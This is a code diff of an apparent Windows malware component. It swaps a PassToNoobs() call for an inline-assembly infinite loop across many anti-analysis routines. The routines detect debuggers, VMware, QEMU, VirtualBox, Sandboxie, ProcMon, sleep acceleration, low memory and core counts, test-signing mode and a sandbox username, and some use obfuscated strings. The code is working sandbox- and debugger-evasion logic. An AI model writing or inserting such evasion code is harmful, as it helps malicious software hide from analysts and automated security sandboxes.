@@ -164,7 +164,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	checkQIP();
 	if(GetNtGlobalFlags() == 'p')
 	{
-	   PassToNoobs();
+	   __asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
     WNDCLASSEX wc;
     HWND hwnd;
@@ -570,7 +573,10 @@ void GetHeapFlags(void)
 	}
 	else
 	{
-		PassToNoobs();
+		__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 } // make sure result != 0
 
@@ -626,17 +632,26 @@ void anti_vm_wmi_1(void)
 
 			if(strstr(prop,vm1))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm2))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm3))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
             result->lpVtbl->Release(result);
         }
@@ -686,17 +701,26 @@ void anti_vm_wmi_2(void)
 
 			if(strstr(prop,vm1))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm2))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm3))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
             result->lpVtbl->Release(result);
         }
@@ -742,17 +766,26 @@ void anti_vm_wmi_3(void)
 			
 			if(strstr(prop,vm1))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm2))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm3))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
             result->lpVtbl->Release(result);
         }
@@ -799,17 +832,26 @@ void anti_vm_wmi_4(void)
 			
 			if(strstr(prop,vm1))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm2))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 
 			if(strstr(prop,vm3))
 			{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
             result->lpVtbl->Release(result);
         }
@@ -849,7 +891,10 @@ void anti_vm_wmi_5(void)
     	}
 		if(GetLastError() == 14007)
 		{
-		PassToNoobs();
+		__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 		}
     results->lpVtbl->Release(results);
     services->lpVtbl->Release(services);
@@ -884,7 +929,10 @@ void anti_vm_wmi_6(void)
 		}
 		if(GetLastError() == 14007)
 		{
-		PassToNoobs();
+		__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 		}
     }
     results->lpVtbl->Release(results);
@@ -922,7 +970,10 @@ void anti_vm_wmi_7(void)
 			if(SysStringByteLen(caption.bstrVal) == 0)
 			{
 			//no data? must be a vm!
-			PassToNoobs();
+			__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 			}
 			result->lpVtbl->Release(result);
         }
@@ -973,16 +1024,25 @@ int reg_enum_vm_check(void)
             {
                 if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
 				{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 				}
 				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
 				{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 				}
 				if(strstr(achKey,decrypted("|her",4,10))) // vbox
 				{
 				
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 				}
 				
             }
@@ -1021,16 +1081,25 @@ int reg_enum_vm_check(void)
             {
                 if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
 				{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 				}
 				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
 				{
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 				}
 				if(strstr(achKey,decrypted("|her",4,10))) // vbox
 				{
 				
-				PassToNoobs();
+				__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 				}
 				
             }
@@ -1049,14 +1118,20 @@ int AntiEmu(void)
 {
 	if(GetModuleHandle(decrypted("RchdEmm/emm",11,1)) !=0) // SbieDll.dll
 	{
-	PassToNoobs();
+	__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 	DWORD ticks = GetTickCount();
 	Sleep(702);
 	DWORD ticks_test = GetTickCount();
 	if((ticks_test - ticks) < 700)
 	{
-	PassToNoobs();
+	__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 	return 0;
 }
@@ -1068,7 +1143,10 @@ void special_usercheck(void)
 	GetUserName(user,&len);
 	if(strstr(user,"Johnson"))
 	{
-			PassToNoobs();
+			__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 }
 
@@ -1117,7 +1195,10 @@ void MemSizeTrick(void)
 	
 	if(biggun <= 2048)
 	{
-		PassToNoobs();
+		__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 }
 void AnotherAntiDebugRoutine(void)
@@ -1201,7 +1282,10 @@ void AntiProcMon(void) // EXPIMENTAL. Detects if procmon has ever been run
 	}
 	else
 	{
-		PassToNoobs();
+		__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 	
 return;
@@ -1224,7 +1308,10 @@ void date_specific_check(char *shortdate)
 		return;
 	}
 	else{
-	PassToNoobs();
+	__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 }
 
@@ -1388,7 +1475,10 @@ char *lang = "";
 		}
 		else
 		{
-			PassToNoobs();
+			__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 		}
 	return;
 }
@@ -1565,7 +1655,10 @@ void CheckCoreCount(void)
 	}
 	if(result < 2)
 	{
-		PassToNoobs();
+		__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 	}
 	else{
 		return;
@@ -1602,7 +1695,10 @@ void testsigning(void)
     	BOOL bTestsigningEnabled = !!(sci.CodeIntegrityOptions & 0x2); // CODEINTEGRITY_OPTION_TESTSIGN
 		if(bTestsigningEnabled)
 		{
-			PassToNoobs();
+			__asm{
+ db 0xEB 
+ db 0xFE 
+ }
 		}
 	}
 }
